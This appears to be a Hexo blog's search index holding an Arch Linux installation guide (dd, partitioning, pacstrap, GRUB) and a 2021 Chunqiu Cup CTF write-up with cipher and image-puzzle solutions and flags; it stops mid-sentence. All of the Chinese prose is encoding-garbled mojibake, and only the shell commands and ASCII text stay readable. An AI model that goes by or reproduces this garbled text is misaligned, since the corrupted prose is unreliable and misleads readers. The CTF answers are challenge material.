<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Archlinux</title>
      <link href="2021/for-fun/archlinux/"/>
      <url>2021/for-fun/archlinux/</url>
      
        <content type="html"><![CDATA[<h3 id="1-åˆ»å½•å¯åŠ¨ä¼˜ç›˜"><a href="#1-åˆ»å½•å¯åŠ¨ä¼˜ç›˜" class="headerlink" title="1.åˆ»å½•å¯åŠ¨ä¼˜ç›˜"></a>1.åˆ»å½•å¯åŠ¨ä¼˜ç›˜</h3><p>å‡†å¤‡ä¸€ä¸ª 2G ä»¥ä¸Šçš„ä¼˜ç›˜ï¼Œåˆ»å½•ä¸€ä¸ªå®‰è£…å¯åŠ¨ç›˜ã€‚</p><p>Windows ä¸‹æ¨èä½¿ç”¨<a href="https://www.poweriso.com/download.php">Power ISO</a>æˆ–è€…<a href="https://rufus.ie/">Rufus</a>è¿›è¡Œå…‰ç›˜åˆ»å½•ã€‚äºŒè€…çš†ä¸ºå…è´¹ä½¿ç”¨çš„è½¯ä»¶ã€‚å…·ä½“æ“ä½œè¯·è‡ªè¡ŒæŸ¥é˜…ï¼Œéƒ½éå¸¸ç®€å•ã€‚</p><p>Linux ä¸‹å¯ä»¥ç›´æ¥ç”¨ dd å‘½ä»¤è¿›è¡Œåˆ»å½•ã€‚æ³¨æ„ of çš„å‚æ•°ä¸º sdx,ä¸æ˜¯ sdx1 sdx2 ç­‰ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">dd</span> <span class="token assign-left variable">bs</span><span class="token operator">=</span>4M <span class="token assign-left variable">if</span><span class="token operator">=</span>/path/to/archlinux.iso <span class="token assign-left variable">of</span><span class="token operator">=</span>/dev/sdx <span class="token assign-left variable">status</span><span class="token operator">=</span>progress <span class="token assign-left variable">oflag</span><span class="token operator">=</span>sync<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bs=4M æŒ‡å®šä¸€ä¸ªè¾ƒä¸ºåˆç†çš„æ–‡ä»¶è¾“å…¥è¾“å‡ºå—å¤§å°ã€‚<br>status=progress ç”¨æ¥è¾“å‡ºåˆ»å½•è¿‡ç¨‹æ€»çš„ä¿¡æ¯ã€‚<br>oflag=sync ç”¨æ¥æ§åˆ¶å†™å…¥æ•°æ®æ—¶çš„è¡Œä¸ºç‰¹å¾ã€‚ç¡®ä¿å‘½ä»¤ç»“æŸæ—¶æ•°æ®åŠå…ƒæ•°æ®çœŸæ­£å†™å…¥ç£ç›˜ï¼Œè€Œä¸æ˜¯åˆšå†™å…¥ç¼“å­˜å°±è¿”å›ã€‚</p><h3 id="2-ä¸»æ¿-BIOS-ç›¸å…³è®¾ç½®"><a href="#2-ä¸»æ¿-BIOS-ç›¸å…³è®¾ç½®" class="headerlink" title="2.ä¸»æ¿ BIOS ç›¸å…³è®¾ç½®"></a>2.ä¸»æ¿ BIOS ç›¸å…³è®¾ç½®</h3><p>åœ¨å¼€æœºçš„æ—¶å€™ï¼ŒæŒ‰ä¸‹ F2/F8/F10 ç­‰(å–å†³ä¸ä½ çš„ä¸»æ¿å‹å·ï¼Œå…·ä½“è¯·æŸ¥é˜…ä½ ä¸»æ¿çš„ç›¸å…³ä¿¡æ¯)æŒ‰é”®ï¼Œè¿›å…¥ä¸»æ¿çš„ BIOS è®¾ç½®ç•Œé¢ã€‚</p><h4 id="å…³é—­ä¸»æ¿è®¾ç½®ä¸­çš„-Secure-Boot"><a href="#å…³é—­ä¸»æ¿è®¾ç½®ä¸­çš„-Secure-Boot" class="headerlink" title="å…³é—­ä¸»æ¿è®¾ç½®ä¸­çš„ Secure Boot"></a>å…³é—­ä¸»æ¿è®¾ç½®ä¸­çš„ Secure Boot</h4><p>æ‰¾åˆ°ä¸€é¡¹åä¸º Secure Boot(åç§°å¯èƒ½ç•¥æœ‰å·®å¼‚)çš„é€‰é¡¹ï¼Œå°†å…¶ Disable ç¦ç”¨ã€‚</p><h4 id="è°ƒæ•´ç¡¬ç›˜å¯åŠ¨é¡ºåº"><a href="#è°ƒæ•´ç¡¬ç›˜å¯åŠ¨é¡ºåº" class="headerlink" title="è°ƒæ•´ç¡¬ç›˜å¯åŠ¨é¡ºåº"></a>è°ƒæ•´ç¡¬ç›˜å¯åŠ¨é¡ºåº</h4><p>æ‰¾åˆ°ç±»ä¼¼åä¸º Boot Options çš„è®¾ç½®é€‰é¡¹ï¼Œå°† USB ä¼˜ç›˜çš„å¯åŠ¨é¡ºåºè°ƒè‡³é¦–ä½ã€‚</p><h4 id="è°ƒæ•´å¯åŠ¨æ–¹å¼ä¸º-UEFI"><a href="#è°ƒæ•´å¯åŠ¨æ–¹å¼ä¸º-UEFI" class="headerlink" title="è°ƒæ•´å¯åŠ¨æ–¹å¼ä¸º UEFI"></a>è°ƒæ•´å¯åŠ¨æ–¹å¼ä¸º UEFI</h4><p>åœ¨æŸäº›æ—§çš„ä¸»æ¿é‡Œï¼Œéœ€è¦è°ƒæ•´å¯åŠ¨æ¨¡å¼ä¸º UEFI,è€Œéä¼ ç»Ÿçš„ BIOSã€‚æ‰¾åˆ°ç±»ä¼¼åä¸º Boot Mode çš„é€‰é¡¹ï¼Œç¡®ä¿å°†å…¶è°ƒæ•´ä¸º UEFI onlyï¼Œè€Œé legacyã€‚</p><p>æœ€åæ’å…¥ä¼˜ç›˜ï¼Œä¿å­˜é€€å‡ºï¼Œä¸€èˆ¬çš„æŒ‰é”®æ˜¯ F10ã€‚æ­¤æ—¶ç³»ç»Ÿé‡å¯ï¼Œä¸å‡ºæ„å¤–ä½ åº”è¯¥å·²ç»è¿›å…¥ archlinux çš„å®‰è£…ç•Œé¢ã€‚</p><h4 id="æ£€æµ‹æ˜¯å¦ä¸º-UEFI"><a href="#æ£€æµ‹æ˜¯å¦ä¸º-UEFI" class="headerlink" title="æ£€æµ‹æ˜¯å¦ä¸º UEFI"></a>æ£€æµ‹æ˜¯å¦ä¸º UEFI</h4><p>åœ¨ä¸€ç³»åˆ—çš„ä¿¡æ¯åˆ·å±åï¼Œå¯ä»¥çœ‹åˆ°å·²ç»ä»¥ root ç™»é™†å®‰è£…ç³»ç»Ÿäº†ï¼Œæ­¤æ—¶ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤æ˜¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /sys/firmware/efi/efivars<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è‹¥è¾“å‡ºäº†ä¸€å †ä¸œè¥¿ï¼Œè¯´æ˜å·²åœ¨ UEFI æ¨¡å¼ã€‚å¦åˆ™è¯·ç¡®è®¤ä½ çš„å¯åŠ¨æ–¹å¼æ˜¯å¦ä¸º UEFIã€‚</p><h3 id="3-è¿æ¥ç½‘ç»œ"><a href="#3-è¿æ¥ç½‘ç»œ" class="headerlink" title="3.è¿æ¥ç½‘ç»œ"></a>3.è¿æ¥ç½‘ç»œ</h3><p>æ— çº¿è¿æ¥:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iwctl                           <span class="token comment">#è¿›å…¥äº¤äº’å¼å‘½ä»¤è¡Œ</span>device list                     <span class="token comment">#åˆ—å‡ºè®¾å¤‡åï¼Œæ¯”å¦‚æ— çº¿ç½‘å¡çœ‹åˆ°å« wlan0</span>station wlan0 scan              <span class="token comment">#æ‰«æç½‘ç»œ</span>station wlan0 get-networks      <span class="token comment">#åˆ—å‡ºç½‘ç»œ æ¯”å¦‚æƒ³è¿æ¥CMCC-5AQ7è¿™ä¸ªæ— çº¿</span>station wlan0 connect CMCC-5AQ7 <span class="token comment">#è¿›è¡Œè¿æ¥ è¾“å…¥å¯†ç å³å¯</span><span class="token builtin class-name">exit</span>                            <span class="token comment">#æˆåŠŸåexité€€å‡º</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰çº¿è¿æ¥:<br>æ­£å¸¸æ¥è¯´ï¼Œåªè¦æ’ä¸Šä¸€ä¸ªå·²ç»è”ç½‘çš„è·¯ç”±å™¨åˆ†å‡ºçš„ç½‘çº¿(DHCP)ï¼Œç›´æ¥å°±èƒ½è”ç½‘ã€‚</p><p>å¯ä»¥ç­‰å¾…å‡ ç§’ç­‰ç½‘ç»œå»ºç«‹é“¾æ¥åå†è¿›è¡Œä¸‹æ­¥æµ‹è¯•ç½‘ç»œçš„æ“ä½œã€‚</p><h3 id="4-æµ‹è¯•ç½‘ç»œ"><a href="#4-æµ‹è¯•ç½‘ç»œ" class="headerlink" title="4.æµ‹è¯•ç½‘ç»œ"></a>4.æµ‹è¯•ç½‘ç»œ</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è‹¥èƒ½çœ‹åˆ°æ•°æ®è¿”å›ï¼Œå³è¯´æ˜å·²ç»è”ç½‘ï¼Œctrl+c ç»ˆæ­¢é€€å‡ºå½“å‰å‘½ä»¤ã€‚å¦‚æœè¿˜æ˜¯æ— æ³•è¿æ¥ï¼Œä½¿ç”¨ <code>ip link set xxx up</code> å‘½ä»¤ç¡®è®¤ä½ å·²ç»æ¿€æ´»äº†å¯¹åº”çš„ç½‘å¡ï¼Œå†é‡æ–°ç»§ç»­ç½‘ç»œé“¾æ¥ä¸æµ‹è¯•ã€‚è‹¥çœ‹åˆ°ç±»ä¼¼<code>Operation not possible due to RF-kill</code>çš„æŠ¥é”™ï¼Œç»§ç»­å°è¯•<code>rfkill unblock wifi</code>æ¥è§£é”æ— çº¿ç½‘å¡ã€‚</p><h3 id="5-ç¦ç”¨è‡ªä½œèªæ˜çš„-reflector"><a href="#5-ç¦ç”¨è‡ªä½œèªæ˜çš„-reflector" class="headerlink" title="5.ç¦ç”¨è‡ªä½œèªæ˜çš„ reflector"></a>5.ç¦ç”¨è‡ªä½œèªæ˜çš„ reflector</h3><p>2020 å¹´æ–°ç‰ˆ archliveiso åŠ å…¥äº† reflector æœåŠ¡ï¼Œå®ƒä¼šè‡ªå·±æ›´æ–° mirrorlistï¼Œç„¶è€Œå…¶ç»“æœå¹¶ä¸å‡†ç¡®ï¼Œå¹¶ä¸”ä¼šåˆ é™¤æ‰éƒ¨åˆ†æºä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸­å›½çš„æºï¼Œè¿™é‡Œè”ç½‘åçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯å°†å…¶ç¦ç”¨ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl stop reflector.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-æ›´æ–°ç³»ç»Ÿæ—¶é’Ÿ"><a href="#6-æ›´æ–°ç³»ç»Ÿæ—¶é’Ÿ" class="headerlink" title="6.æ›´æ–°ç³»ç»Ÿæ—¶é’Ÿ"></a>6.æ›´æ–°ç³»ç»Ÿæ—¶é’Ÿ</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">timedatectl set-ntp <span class="token boolean">true</span>    <span class="token comment">#å°†ç³»ç»Ÿæ—¶é—´ä¸ç½‘ç»œæ—¶é—´è¿›è¡ŒåŒæ­¥</span>timedatectl status          <span class="token comment">#æ£€æŸ¥æœåŠ¡çŠ¶æ€</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-æ›´æ¢å›½å†…é•œåƒæºåŠ å¿«ä¸‹è½½é€Ÿåº¦"><a href="#7-æ›´æ¢å›½å†…é•œåƒæºåŠ å¿«ä¸‹è½½é€Ÿåº¦" class="headerlink" title="7.æ›´æ¢å›½å†…é•œåƒæºåŠ å¿«ä¸‹è½½é€Ÿåº¦"></a>7.æ›´æ¢å›½å†…é•œåƒæºåŠ å¿«ä¸‹è½½é€Ÿåº¦</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/pacman.d/mirrorlist  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ”¾åœ¨æœ€ä¸Šé¢çš„æ˜¯ä¼šä½¿ç”¨çš„æ›´æ–°æº,æŠŠä¸­ç§‘å¤§ ustc çš„æˆ–è€…æ¸…åçš„æ”¾åœ¨æœ€ä¸Šé¢ã€‚</p><h3 id="8-åˆ†åŒº"><a href="#8-åˆ†åŒº" class="headerlink" title="8.åˆ†åŒº"></a>8.åˆ†åŒº</h3><p>è¿™é‡Œæ€»å…±è®¾ç½®å››ä¸ªåˆ†åŒºï¼Œå¯ä»¥æ»¡è¶³ç»å¤§å¤šæ•°äººçš„éœ€æ±‚ã€‚</p><ul><li>æ ¹ç›®å½•ï¼š <code>/</code> 100G</li><li>EFIï¼š <code>/boot</code> 300M</li><li>äº¤æ¢åˆ†åŒº: <code>swap</code> 2G</li><li>ç”¨æˆ·ä¸»ç›®å½•ï¼š <code>/home</code> å‰©ä½™å…¨éƒ¨ è¶Šå¤§è¶Šå¥½</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsblk                       <span class="token comment">#æ˜¾ç¤ºåˆ†åŒºæƒ…å†µ</span><span class="token function">parted</span> /dev/sdx             <span class="token comment">#æ‰§è¡Œpartedï¼Œè¿›è¡Œç£ç›˜ç±»å‹å˜æ›´</span><span class="token punctuation">(</span>parted<span class="token punctuation">)</span>mktableNew disk label type? gpt    <span class="token comment">#è¾“å…¥gpt å°†ç£ç›˜ç±»å‹è½¬æ¢ä¸ºgpt å¦‚ç£ç›˜æœ‰æ•°æ®ä¼šè­¦å‘Šï¼Œè¾“å…¥yeså³å¯</span>quit                        <span class="token comment">#æœ€åquité€€å‡ºpartedå‘½ä»¤è¡Œäº¤äº’</span><span class="token function">cfdisk</span>  /dev/sdx            <span class="token comment">#æ¥æ‰§è¡Œåˆ†åŒºæ“ä½œ,åˆ†é…å„ä¸ªåˆ†åŒºå¤§å°ï¼Œç±»å‹</span><span class="token function">fdisk</span> -l                    <span class="token comment">#å¤æŸ¥ç£ç›˜æƒ…å†µ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€èˆ¬å»ºè®®å°† EFI åˆ†åŒºè®¾ç½®ä¸ºç£ç›˜çš„ç¬¬ä¸€ä¸ªåˆ†åŒºï¼Œæ®è¯´æœ‰äº›ä¸»æ¿å¦‚æœä¸å°† EFI è®¾ç½®ä¸ºç¬¬ä¸€ä¸ªåˆ†åŒºï¼Œå¯èƒ½æœ‰ä¸å…¼å®¹çš„é—®é¢˜ã€‚</p><h3 id="9-æ ¼å¼åŒ–"><a href="#9-æ ¼å¼åŒ–" class="headerlink" title="9.æ ¼å¼åŒ–"></a>9.æ ¼å¼åŒ–</h3><p>è¿™é‡Œçš„ sdax åªæ˜¯ä¾‹å­ï¼Œå…·ä½“æ ¹æ®ä½ çš„å®é™…æƒ…å†µæ¥ï¼Œè¯·æ³¨æ„è§†é¢‘ä¸­çš„æ“ä½œã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#ç£ç›˜è‹¥æœ‰æ•°æ®ä¼šé—® 'proceed any way?' yå›è½¦ å³å¯</span>mkfs.ext4  /dev/sdax            <span class="token comment">#æ ¼å¼åŒ–æ ¹ç›®å½•å’Œhomeç›®å½•çš„ä¸¤ä¸ªåˆ†åŒº</span>mkfs.vfat  /dev/sdax            <span class="token comment">#æ ¼å¼åŒ–efiåˆ†åŒº</span><span class="token function">mkswap</span> -f /dev/sdax             <span class="token comment">#æ ¼å¼åŒ–swap</span><span class="token function">swapon</span> /dev/sdax                <span class="token comment">#æ‰“å¼€swapåˆ†åŒº</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-æŒ‚è½½"><a href="#10-æŒ‚è½½" class="headerlink" title="10.æŒ‚è½½"></a>10.æŒ‚è½½</h3><p>åœ¨æŒ‚è½½æ—¶ï¼ŒæŒ‚è½½æ˜¯æœ‰é¡ºåºçš„ï¼Œéœ€è¦ä»æ ¹ç›®å½•å¼€å§‹æŒ‚è½½<br>è¿™é‡Œçš„ sdax åªæ˜¯ä¾‹å­ï¼Œå…·ä½“æ ¹æ®ä½ çš„å®é™…æƒ…å†µæ¥ï¼Œè¯·æ³¨æ„è§†é¢‘ä¸­çš„æ“ä½œã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/sdax  /mnt<span class="token function">mkdir</span> /mnt/home<span class="token function">mount</span> /dev/sdax /mnt/home<span class="token function">mkdir</span> /mnt/boot<span class="token function">mount</span> /dev/sdax /mnt/boot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-å®‰è£…ç³»ç»Ÿ"><a href="#11-å®‰è£…ç³»ç»Ÿ" class="headerlink" title="11.å®‰è£…ç³»ç»Ÿ"></a>11.å®‰è£…ç³»ç»Ÿ</h3><p>åŸºç¡€åŒ…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacstrap /mnt base base-devel linux linux-firmware  <span class="token comment">#base-develåœ¨AURåŒ…çš„å®‰è£…æ˜¯å¿…é¡»çš„</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŠŸèƒ½æ€§è½¯ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacstrap /mnt dhcpcd iwd <span class="token function">vim</span> <span class="token function">sudo</span> bash-completion   <span class="token comment">#ä¸€ä¸ªæœ‰çº¿æ‰€éœ€ ä¸€ä¸ªæ— çº¿æ‰€éœ€ ä¸€ä¸ªç¼–è¾‘å™¨  ä¸€ä¸ªææƒå·¥å…· ä¸€ä¸ªè¡¥å…¨å·¥å…· iwdä¹Ÿéœ€è¦dhcpcd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="12-ç”Ÿäº§-fstab"><a href="#12-ç”Ÿäº§-fstab" class="headerlink" title="12.ç”Ÿäº§ fstab"></a>12.ç”Ÿäº§ fstab</h3><p>fstab ç”¨æ¥å®šä¹‰ç£ç›˜åˆ†åŒº</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">genfstab -U /mnt <span class="token operator">&gt;&gt;</span> /mnt/etc/fstab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¤æŸ¥ä¸€ä¸‹ /mnt/etc/fstab ç¡®ä¿æ²¡æœ‰é”™è¯¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /mnt/etc/fstab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="13-change-root"><a href="#13-change-root" class="headerlink" title="13.change root"></a>13.change root</h3><p>æŠŠç¯å¢ƒåˆ‡æ¢åˆ°æ–°ç³»ç»Ÿçš„/mnt ä¸‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arch-chroot /mnt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="14-æ—¶åŒº"><a href="#14-æ—¶åŒº" class="headerlink" title="14.æ—¶åŒº"></a>14.æ—¶åŒº</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime     <span class="token comment">#ä¸º/usrä¸‹åˆé€‚çš„æ—¶åŒºåœ¨/etcä¸‹åˆ›å»ºç¬¦å·è¿æ¥</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="15-ç¡¬ä»¶æ—¶é—´è®¾ç½®"><a href="#15-ç¡¬ä»¶æ—¶é—´è®¾ç½®" class="headerlink" title="15.ç¡¬ä»¶æ—¶é—´è®¾ç½®"></a>15.ç¡¬ä»¶æ—¶é—´è®¾ç½®</h3><p>å°†ç³»ç»Ÿæ—¶é—´åŒæ­¥åˆ°ç¡¬ä»¶æ—¶é—´</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hwclock --systohc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="16-è®¾ç½®-Locale"><a href="#16-è®¾ç½®-Locale" class="headerlink" title="16.è®¾ç½® Locale"></a>16.è®¾ç½® Locale</h3><p>Locale å†³å®šäº†è½¯ä»¶ä½¿ç”¨çš„è¯­è¨€ã€ä¹¦å†™ä¹ æƒ¯å’Œå­—ç¬¦é›†ã€‚</p><p>ç¼–è¾‘ /etc/locale.genï¼Œå»æ‰ en_US.UTF-8 è¡Œä»¥åŠ zh_CN.UTF-8 çš„æ³¨é‡Šç¬¦å·ï¼ˆ#ï¼‰ã€‚</p><p>ç„¶åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”Ÿæˆ localeã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">locale-gen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ /etc/locale.conf è¾“å…¥å†…å®¹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'LANG=en_US.UTF-8'</span>  <span class="token operator">&gt;</span> /etc/locale.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="17-ä¸º-root-ç”¨æˆ·è®¾ç½®å¯†ç "><a href="#17-ä¸º-root-ç”¨æˆ·è®¾ç½®å¯†ç " class="headerlink" title="17.ä¸º root ç”¨æˆ·è®¾ç½®å¯†ç "></a>17.ä¸º root ç”¨æˆ·è®¾ç½®å¯†ç </h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">passwd</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="18-å®‰è£…å¾®ç "><a href="#18-å®‰è£…å¾®ç " class="headerlink" title="18.å®‰è£…å¾®ç "></a>18.å®‰è£…å¾®ç </h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman -S intel-ucode   <span class="token comment">#Intel</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="19-å®‰è£…å¼•å¯¼ç¨‹åº"><a href="#19-å®‰è£…å¼•å¯¼ç¨‹åº" class="headerlink" title="19.å®‰è£…å¼•å¯¼ç¨‹åº"></a>19.å®‰è£…å¼•å¯¼ç¨‹åº</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman -S grub efibootmgr   <span class="token comment">#grubæ˜¯å¯åŠ¨å¼•å¯¼å™¨ï¼Œefibootmgrè¢« grub è„šæœ¬ç”¨æ¥å°†å¯åŠ¨é¡¹å†™å…¥ NVRAMã€‚</span>grub-install --target<span class="token operator">=</span>x86_64-efi --efi-directory<span class="token operator">=</span>/boot --bootloader-id<span class="token operator">=</span>GRUB <span class="token comment">#å–åä¸ºGRUB å¹¶å°†grubx64.efiå®‰è£…åˆ°ä¹‹å‰çš„æŒ‡å®šä½ç½®</span><span class="token function">grub-mkconfig</span> -o /boot/grub/grub.cfg    <span class="token comment">#ç”ŸæˆGRUBæ‰€éœ€çš„é…ç½®æ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> -p /boot/EFI/BOOT<span class="token function">mv</span> /boot/EFI/GRUB/grubx64.efi /boot/EFI/BOOT/BOOTX64.EFI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="20-å®Œæˆå®‰è£…"><a href="#20-å®Œæˆå®‰è£…" class="headerlink" title="20.å®Œæˆå®‰è£…"></a>20.å®Œæˆå®‰è£…</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">exit</span>                <span class="token comment"># é€€å›å®‰è£…ç¯å¢ƒ#</span><span class="token function">umount</span> -R  /mnt     <span class="token comment"># å¸è½½æ–°åˆ†åŒº</span><span class="token function">reboot</span>              <span class="token comment"># é‡å¯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„ï¼Œé‡å¯å‰è¦å…ˆæ‹”æ‰ä¼˜ç›˜ï¼Œå¦åˆ™ä½ é‡å¯åè¿˜æ˜¯è¿›å®‰è£…ç¨‹åºè€Œä¸æ˜¯å®‰è£…å¥½çš„ç³»ç»Ÿã€‚é‡å¯åï¼Œå¼€å¯ dhcp æœåŠ¡ï¼Œå³å¯è¿æ¥ç½‘ç»œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start dhcpcd  <span class="token comment">#ç«‹å³å¯åŠ¨dhcp</span><span class="token function">ping</span> www.baidu.com      <span class="token comment">#æµ‹è¯•ç½‘ç»œè¿æ¥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è‹¥ä¸ºæ— çº¿é“¾æ¥ï¼Œåˆ™è¿˜éœ€è¦å¯åŠ¨ iwd æ‰å¯ä»¥ä½¿ç”¨ iwctl è¿æ¥ç½‘ç»œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start iwd <span class="token comment">#ç«‹å³å¯åŠ¨iwd</span>iwctl               <span class="token comment">#å’Œä¹‹å‰çš„æ–¹å¼ä¸€æ ·ï¼Œè¿æ¥æ— çº¿ç½‘ç»œ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021æ˜¥ç§‹æ¯</title>
      <link href="2021/zuo-ti-ji-lu/2021-chun-qiu-bei/"/>
      <url>2021/zuo-ti-ji-lu/2021-chun-qiu-bei/</url>
      
        <content type="html"><![CDATA[<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>ç”»ä¸€ä¸ªFUNçš„å›¾ç‰‡ç»™å®ƒæ‰«</p><p>flag{ju5t_f0r_FUN}</p><h2 id="åäºŒå®«çš„æŒ‘è¡…"><a href="#åäºŒå®«çš„æŒ‘è¡…" class="headerlink" title="åäºŒå®«çš„æŒ‘è¡…"></a>åäºŒå®«çš„æŒ‘è¡…</h2><p>åŸæ–‡ï¼š</p><pre class="line-numbers language-none"><code class="language-none">^#@$@#()/&gt;@?==%1(!)&gt;(*+3&lt;#86@-7$^.4&amp;)8%#5&amp;6!=%1#$-$+5&amp;?#!.03!%=@=1010?(*~#??.+)%&amp;.7^8=1%*^=$5$7@@8&gt;&amp;*99@0185(+7)&lt;%3#@^4&amp;@@&lt;.)$3*#%%&lt;&lt;*++.@.?=~**+!==65^@&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ç½‘ä¸Šå…œå…œè½¬è½¬æ‰¾åˆ°è§£å¯†æ–¹æ³•<a href="https://www.bilibili.com/video/BV1nX4y1u7Eo/">Bç«™çš„ä¸€ä¸ªè§†é¢‘è®²çš„éå¸¸è¯¦ç»†</a></p><p>è§„åˆ™æ˜¯ä»ç¬¬ä¸€ä¸ªå¼€å§‹ï¼Œä¾æ¬¡å¾€ä¸‹ä¸€è¡Œå¾€å³ä¸¤æ ¼</p><p>resultï¼š</p><pre class="line-numbers language-none"><code class="language-none">^&gt;%..@3*&amp;#(#0+@#+.@*53)8@+@$+&amp;!%&gt;^&amp;.@36%&amp;&amp;4@?#&lt;!=.*9@=(#=@79@&lt;~)8%=^=0.*/611811)*&gt;@#00%8$+@-$1?*53!?7-+(^(*==$$5*=+#==^4&amp;~$7%6%.&amp;?#5)%51!)#?$&lt;&lt;^()8!?7%&lt;@<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ”¾åˆ°AZdecrypté‡Œå»è§£ç å°±å¯ä»¥äº†</p><p>è§£å‡ºæ¥æ˜¯è¿™ä¸ª</p><pre class="line-numbers language-none"><code class="language-none">IKILLED A LOT OF PEOPLE AND THE PEOPLE I KILLED WILL BECOME SLAVES TO SERVE ME THIS IS FLAG WUUHUU TAKE OFF I HOPE YOU CAN DECRYPT IT AS SOON AS POSSIBLE OR I WILL CONTINUE TO COMMIT THE CRIME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag{WUUHUUTAKEOFF}</p><h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>è¦æˆ‘ä»¬æŠŠè¿™ä¸€åƒå¤šå¼ å°å›¾ç‰‡æ‹¼æˆä¸€å¼ å›¾ç‰‡ã€‚ã€‚ã€‚</p><p>æ‰¾åˆ°æœ‰å­—ç¬¦çš„å›¾ç‰‡ï¼Œåœ¨é‚£ä¸ªåŠ¨ç‰©çš„èº«ä¸Šï¼Œç›´æ¥æ‹¿psæ‹¼</p><p>æ‹¼å‡ºæ¥å¤§æ¦‚è¿™ä¹ˆä¸ªæ•ˆæœï¼Œå¾ˆç³Š</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208194417110.png" alt="image-20210208194417110"></p><p>flag{w9w45my6x8kk4e8gp9nqm6j2c154wad49}</p><h2 id="old-driver"><a href="#old-driver" class="headerlink" title="old_driver"></a>old_driver</h2><p>ä¸‹è½½ä¸‹æ¥åæ˜¯ä¸€å 